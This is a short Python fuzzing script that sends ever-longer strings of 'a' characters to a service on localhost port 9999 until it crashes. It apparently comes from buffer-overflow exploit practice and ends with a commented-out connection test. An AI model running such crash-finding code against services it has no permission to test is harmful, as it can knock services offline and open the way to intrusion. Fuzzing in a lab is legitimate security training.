import socket, sys

host = "127.0.0.1"
port = 9999

payload = "a"*100


while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(3)
			s.connect((host, port))
			s.recv(1024)
			print(f"Fuzzing with {len(payload)} bytes....")
			s.send(bytes(payload + "\r\n", 'latin-1'))
			s.recv(1024)
	except:
		print(f"Application crashed at {len(payload)} bytes")
		sys.exit(0)

	payload += "a"*200
"""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(bytes("data" + "\r\n", 'latin-1'))
print(s.recv(1024))
s.close()

"""